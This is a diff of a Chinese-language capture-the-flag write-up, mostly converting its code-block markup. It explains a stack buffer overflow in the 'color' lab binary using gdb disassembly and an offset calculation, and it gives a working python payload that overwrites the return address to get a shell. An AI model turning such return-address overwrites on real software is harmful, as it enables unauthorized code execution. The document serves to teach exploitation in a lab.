@@ -18,7 +18,7 @@ challenge_url_comment: 需要注册登录
 
 打开看一下 `color.c`：
 
-{% highlight c linenos %}
+```{  .c .numberLines }
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -52,21 +52,21 @@ int main(char argc, char** argv) {
         puts("Boo... I hate that color! :(");
     }
 }
-{% endhighlight %}
+```
 
 这是一个典型的缓冲区溢出问题。正常情况下，`vuln` 将始终返回 0，导致 `main` 函数始终都执行 `else` 分支。我们的目标是能够执行 `if` 分支。
 
 再看一下 `Makefile`:
 
-{% highlight Makefile linenos %}
+```{ .makefile .numberLines }
         # 省略部分内容 ...
 $(prob).o: $(prob).c
         cc -c -m32 -fno-stack-protector $(prob).c
-{% endhighlight %}
+```
 
 使用 `-fno-stack-protector` 关闭了栈溢出保护。因此我们可以直接通过覆盖返回地址进行爆破。使用 gdb 反汇编一下 `vuln` 函数：
 
-{% highlight text linenos %}
+```{ .asm .numberLines }
    0x0804858b <+0>:     push   %ebp
    0x0804858c <+1>:     mov    %esp,%ebp
    0x0804858e <+3>:     sub    $0x38,%esp
@@ -93,11 +93,11 @@ $(prob).o: $(prob).c
    0x080485da <+79>:    mov    -0xc(%ebp),%eax
    0x080485dd <+82>:    leave
    0x080485de <+83>:    ret
-{% endhighlight %}
+```
 
 第 9 行可以看到，缓冲区大小为 0x30 即 48 个字节（虽然代码中的数组大小为 32 个字节）。所以我们需要 48 个字节把缓冲区填满，再加 4 个字节覆盖 `ebp`，再 4 个字节覆盖返回地址。返回地址就填进 `if` 分支的开始处，用 gdb 查看一下 `main`：
 
-{% highlight text linenos %}
+```{ .asm .numberLines }
                         ......
    0x0804864e <+111>:   call   0x804858b <vuln>
    0x08048653 <+116>:   test   %eax,%eax
@@ -115,11 +115,13 @@ $(prob).o: $(prob).c
    0x0804867f <+160>:   call   0x8048450 <system@plt>
    0x08048684 <+165>:   add    $0x10,%esp
                         ......
-{% endhighlight %}
+```
 
 `0x08048657` 就是我们希望的返回地址。因此构造 payload 并传入 `color` 程序:
 
-`(python -c "print '1234567890123456789012345678901234567890123456780000\x57\x86\x04\x08'";cat) | ./color`
+```bash
+(python -c "print '1234567890123456789012345678901234567890123456780000\x57\x86\x04\x08'";cat) | ./color
+```
 
 至此我们就得到了 shell：
 
